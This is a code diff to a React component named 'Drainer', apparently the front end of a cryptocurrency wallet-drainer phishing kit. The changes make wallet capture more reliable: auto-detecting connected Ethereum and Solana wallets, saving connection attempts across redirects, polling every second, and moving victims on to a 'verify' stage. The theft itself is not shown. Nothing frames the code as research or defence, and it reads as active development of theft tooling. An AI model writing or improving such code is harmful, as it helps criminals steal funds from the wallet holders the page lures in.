@@ -24,13 +24,34 @@ export default function Drainer() {
   // Auto-detect already connected wallets
   useEffect(() => {
     const checkConnectedWallet = async () => {
+      // Check for any pending connection attempts first
+      const connectionAttempt = sessionStorage.getItem('walletConnectionAttempt')
+      if (connectionAttempt) {
+        try {
+          const { wallet, timestamp } = JSON.parse(connectionAttempt)
+          // Clear the stored attempt
+          sessionStorage.removeItem('walletConnectionAttempt')
+          
+          // If the attempt was recent (within last 2 minutes), set the selected wallet
+          if (Date.now() - timestamp < 120000) {
+            setSelectedWallet(wallet)
+            setConnectionStatus('connecting')
+          }
+        } catch (e) {
+          console.error('Error parsing connection attempt:', e)
+        }
+      }
+
       const ethereum = (window as any).ethereum
-      // Support all Solana wallets: Phantom, Backpack, Solflare, etc.
+      // Support all Solana wallets
       const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare
 
       // Check Solana (all wallets)
       if (solana && solana.publicKey) {
-        setAccount(solana.publicKey.toString())
+        const address = solana.publicKey.toString()
+        setAccount(address)
+        setWalletAddress(address)
+        setConnectionStatus('connected')
         setStage('verify')
         return
       }
@@ -45,36 +66,76 @@ export default function Drainer() {
           
           // Try to get accounts without requesting (check if already connected)
           const accounts = await provider.request({ method: 'eth_accounts' })
-          if (accounts && accounts.length > 0) {
+          if (accounts && accounts[0]) {
             setAccount(accounts[0])
+            setWalletAddress(accounts[0])
+            setConnectionStatus('connected')
             setStage('verify')
           }
         } catch (e) {
-          // Not connected, stay on connect stage
+          console.error('Error checking connected wallet:', e)
         }
       }
     }
 
+    // Check for wallet connections on initial load
     checkConnectedWallet()
 
     // Listen for account changes
     const handleAccountsChanged = (accounts: string[]) => {
       if (accounts && accounts.length > 0) {
         setAccount(accounts[0])
+        setWalletAddress(accounts[0])
+        setConnectionStatus('connected')
         setStage('verify')
       } else {
         setAccount('')
+        setWalletAddress('')
+        setConnectionStatus('idle')
         setStage('connect')
       }
     }
 
-    if ((window as any).ethereum) {
-      ;(window as any).ethereum.on('accountsChanged', handleAccountsChanged)
+    // Listen for Solana connect events
+    const handleSolanaConnect = () => {
+      const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare
+      if (solana?.publicKey) {
+        const address = solana.publicKey.toString()
+        setAccount(address)
+        setWalletAddress(address)
+        setConnectionStatus('connected')
+        setStage('verify')
+      }
     }
 
+    // Set up event listeners
+    if ((window as any).ethereum) {
+      ;(window as any).ethereum.on('accountsChanged', handleAccountsChanged)
+      ;(window as any).ethereum.on('chainChanged', () => window.location.reload())
+    }
+
+    // Add Solana event listeners if available
+    const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare
+    if (solana) {
+      solana.on('connect', handleSolanaConnect)
+      solana.on('disconnect', () => {
+        setAccount('')
+        setWalletAddress('')
+        setConnectionStatus('idle')
+        setStage('connect')
+      })
+    }
+
+    // Clean up event listeners
     return () => {
       if ((window as any).ethereum) {
         ;(window as any).ethereum.removeListener('accountsChanged', handleAccountsChanged)
+        ;(window as any).ethereum.removeListener('chainChanged', () => window.location.reload())
+      }
+      
+      if (solana) {
+        solana.removeListener('connect', handleSolanaConnect)
+        solana.removeListener('disconnect', () => {})
       }
     }
   }, [])
@@ -174,6 +235,62 @@ export default function Drainer() {
     },
   ]
 
+  // Handle wallet connection state changes
+  useEffect(() => {
+    const checkConnection = async () => {
+      if (connectionStatus === 'connecting' && selectedWallet) {
+        try {
+          const wallet = wallets.find(w => w.name.toLowerCase() === selectedWallet.toLowerCase())
+          if (!wallet) return
+
+          // Check Solana wallets
+          if (wallet.type === 'solana' && (window as any).solana) {
+            const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare
+            if (solana.publicKey) {
+              const connectedAddress = solana.publicKey.toString()
+              setAccount(connectedAddress)
+              setWalletAddress(connectedAddress)
+              setConnectionStatus('connected')
+              setTimeout(() => setStage('verify'), 1000)
+              return true
+            }
+          }
+          
+          // Check EVM wallets
+          if (wallet.type === 'evm' && (window as any).ethereum) {
+            const ethereum = (window as any).ethereum
+            const accounts = await ethereum.request({ method: 'eth_accounts' })
+            if (accounts && accounts[0]) {
+              setAccount(accounts[0])
+              setWalletAddress(accounts[0])
+              setConnectionStatus('connected')
+              setTimeout(() => setStage('verify'), 1000)
+              return true
+            }
+          }
+        } catch (e) {
+          console.error('Connection check error:', e)
+          setConnectionStatus('error')
+          setConnectionError('Failed to check connection. Please try again.')
+        }
+      }
+      return false
+    }
+
+    // Check connection status every second when in connecting state
+    let interval: NodeJS.Timeout
+    if (connectionStatus === 'connecting') {
+      // Initial check
+      checkConnection()
+      // Then check every second
+      interval = setInterval(checkConnection, 1000)
+    }
+
+    return () => {
+      if (interval) clearInterval(interval)
+    }
+  }, [connectionStatus, selectedWallet])
+
   const connectWallet = async (walletType: string) => {
     setConnectionStatus('connecting')
     setConnectionError('')
@@ -197,6 +314,11 @@ export default function Drainer() {
         }
         const linkKey = walletType.toLowerCase().replace(/\s+/g, '')
         if (links[linkKey]) {
+          // Store connection attempt in session storage
+          sessionStorage.setItem('walletConnectionAttempt', JSON.stringify({
+            wallet: walletType,
+            timestamp: Date.now()
+          }))
           window.location.href = links[linkKey]
           return
         }
